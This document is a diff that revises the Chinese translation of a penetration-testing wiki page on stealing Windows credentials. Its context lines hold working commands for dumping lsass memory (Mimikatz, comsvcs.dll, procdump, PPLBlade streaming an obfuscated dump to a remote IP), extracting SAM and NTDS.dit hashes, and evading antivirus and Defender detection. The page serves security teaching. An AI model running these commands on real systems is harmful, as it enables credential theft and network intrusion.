@@ -1,8 +1,8 @@
-# 窃取Windows凭据
+# Stealing Windows Credentials
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## 凭据Mimikatz
+## Credentials Mimikatz
 ```bash
 #Elevate Privileges to extract the credentials
 privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
@@ -28,7 +28,7 @@ Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpa
 
 ## 使用 Meterpreter 的凭据
 
-使用我创建的 [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **来** **在受害者内部搜索密码和哈希。**
+使用我创建的 [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **来** **搜索受害者内部的密码和哈希。**
 ```bash
 #Credentials from SAM
 post/windows/gather/smart_hashdump
@@ -65,18 +65,18 @@ mimikatz # sekurlsa::minidump lsass.dmp
 //Extract credentials
 mimikatz # sekurlsa::logonPasswords
 ```
-此过程通过 [SprayKatz](https://github.com/aas-n/spraykatz) 自动完成： `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`
+此过程是通过 [SprayKatz](https://github.com/aas-n/spraykatz) 自动完成的： `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`
 
-**注意**：某些 **AV** 可能会将 **procdump.exe 用于转储 lsass.exe** 视为 **恶意**，这是因为它们正在 **检测** 字符串 **"procdump.exe" 和 "lsass.exe"**。因此，将 lsass.exe 的 **PID** 作为参数传递给 procdump **而不是** lsass.exe 的 **名称** 更加 **隐蔽**。
+**注意**：某些 **AV** 可能会将 **procdump.exe 用于转储 lsass.exe** 视为 **恶意**，这是因为它们正在 **检测** 字符串 **"procdump.exe" 和 "lsass.exe"**。因此，将 lsass.exe 的 **PID** 作为参数传递给 procdump **而不是** 使用 **名称 lsass.exe** 更加 **隐蔽**。
 
 ### 使用 **comsvcs.dll** 转储 lsass
 
-在 `C:\Windows\System32` 中找到的名为 **comsvcs.dll** 的 DLL 负责在崩溃事件中 **转储进程内存**。该 DLL 包含一个名为 **`MiniDumpW`** 的 **函数**，旨在通过 `rundll32.exe` 调用。\
+在 `C:\Windows\System32` 中找到的名为 **comsvcs.dll** 的 DLL 负责在崩溃事件中 **转储进程内存**。此 DLL 包含一个名为 **`MiniDumpW`** 的 **函数**，旨在通过 `rundll32.exe` 调用。\
 使用前两个参数是无关紧要的，但第三个参数分为三个部分。要转储的进程 ID 是第一部分，转储文件位置是第二部分，第三部分严格是单词 **full**。没有其他选项。\
 解析这三个部分后，DLL 开始创建转储文件并将指定进程的内存转移到该文件中。\
-利用 **comsvcs.dll** 可以转储 lsass 进程，从而无需上传和执行 procdump。此方法的详细信息可在 [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords) 中找到。
+利用 **comsvcs.dll** 可以转储 lsass 进程，从而无需上传和执行 procdump。此方法的详细描述见 [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords)。
 
-执行的命令如下：
+执行时使用以下命令：
 ```bash
 rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
 ```
@@ -85,32 +85,32 @@ rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
 ### **使用任务管理器转储 lsass**
 
 1. 右键单击任务栏，然后单击任务管理器
-2. 单击更多详细信息
-3. 在进程选项卡中搜索“本地安全授权进程”
+2. 单击“更多详细信息”
+3. 在“进程”选项卡中搜索“本地安全授权进程”
 4. 右键单击“本地安全授权进程”，然后单击“创建转储文件”。
 
 ### 使用 procdump 转储 lsass
 
-[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) 是一个 Microsoft 签名的二进制文件，是 [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) 套件的一部分。
+[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) 是一个微软签名的二进制文件，是 [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) 套件的一部分。
 ```
 Get-Process -Name LSASS
 .\procdump.exe -ma 608 lsass.dmp
 ```
 ## Dumpin lsass with PPLBlade
 
-[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) 是一个受保护进程转储工具，支持对内存转储进行混淆，并在不将其写入磁盘的情况下将其传输到远程工作站。
+[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) 是一个受保护进程转储工具，支持模糊化内存转储并在不将其写入磁盘的情况下将其传输到远程工作站。
 
-**关键功能**：
+**主要功能**：
 
 1. 绕过 PPL 保护
-2. 混淆内存转储文件以规避 Defender 基于签名的检测机制
+2. 模糊化内存转储文件以规避 Defender 基于签名的检测机制
 3. 使用 RAW 和 SMB 上传方法上传内存转储，而不将其写入磁盘（无文件转储）
 ```bash
 PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
 ```
 ## CrackMapExec
 
-### 转储 SAM 哈希
+### Dump SAM hashes
 ```
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
 ```
@@ -133,7 +133,7 @@ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
 ```
 ## Stealing SAM & SYSTEM
 
-这些文件应该**位于**_C:\windows\system32\config\SAM_和_C:\windows\system32\config\SYSTEM._ 但是**你不能以常规方式复制它们**，因为它们受到保护。
+这些文件应该**位于** _C:\windows\system32\config\SAM_ 和 _C:\windows\system32\config\SYSTEM._ 但是**你不能以常规方式复制它们**，因为它们受到保护。
 
 ### From Registry
 
@@ -148,7 +148,7 @@ reg save HKLM\security security
 samdump2 SYSTEM SAM
 impacket-secretsdump -sam sam -security security -system system LOCAL
 ```
-### 卷影复制
+### Volume Shadow Copy
 
 您可以使用此服务复制受保护的文件。您需要是管理员。
 
@@ -192,11 +192,11 @@ Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c
 - **链接表**：它跟踪关系，例如组成员资格。
 - **SD 表**：每个对象的 **安全描述符** 存储在这里，确保存储对象的安全性和访问控制。
 
-更多信息请参见：[http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)
+有关更多信息：[http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)
 
-Windows 使用 _Ntdsa.dll_ 与该文件进行交互，并由 _lsass.exe_ 使用。然后，**NTDS.dit** 文件的一部分可能位于 **`lsass`** 内存中（您可以找到最近访问的数据，可能是由于使用 **缓存** 提高性能）。
+Windows 使用 _Ntdsa.dll_ 与该文件交互，并由 _lsass.exe_ 使用。然后，**NTDS.dit** 文件的一部分可能位于 **`lsass`** 内存中（您可以找到最近访问的数据，可能是由于使用 **缓存** 提高了性能）。
 
-#### 解密 NTDS.dit 内的哈希
+#### 解密 NTDS.dit 中的哈希
 
 哈希被加密三次：
 
@@ -212,7 +212,7 @@ Windows 使用 _Ntdsa.dll_ 与该文件进行交互，并由 _lsass.exe_ 使用�
 ```bash
 ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
 ```
-您还可以使用 [**卷影复制**](./#stealing-sam-and-system) 技巧来复制 **ntds.dit** 文件。请记住，您还需要 **SYSTEM 文件** 的副本（同样，您可以 [**从注册表转储或使用卷影复制**](./#stealing-sam-and-system) 技巧）。
+您还可以使用 [**卷影复制**](#stealing-sam-and-system) 技巧来复制 **ntds.dit** 文件。请记住，您还需要 **SYSTEM 文件** 的副本（同样，您可以 [**从注册表转储或使用卷影复制**](#stealing-sam-and-system) 技巧）。
 
 ### **从 NTDS.dit 中提取哈希**
 
@@ -234,7 +234,7 @@ NTDS 对象可以使用 [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlit
 ```
 ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
 ```
-`SYSTEM` hive 是可选的，但允许解密秘密（NT 和 LM 哈希、补充凭据，如明文密码、kerberos 或信任密钥、NT 和 LM 密码历史）。除了其他信息外，提取的数据包括：用户和机器账户及其哈希、UAC 标志、最后登录和密码更改的时间戳、账户描述、名称、UPN、SPN、组和递归成员资格、组织单位树和成员资格、受信任的域及其信任类型、方向和属性...
+`SYSTEM` hive 是可选的，但允许解密秘密（NT 和 LM 哈希、补充凭据，如明文密码、Kerberos 或信任密钥、NT 和 LM 密码历史）。除了其他信息外，提取的数据包括：用户和计算机帐户及其哈希、UAC 标志、上次登录和密码更改的时间戳、帐户描述、名称、UPN、SPN、组和递归成员资格、组织单位树和成员资格、受信任的域及其信任类型、方向和属性...
 
 ## Lazagne
 
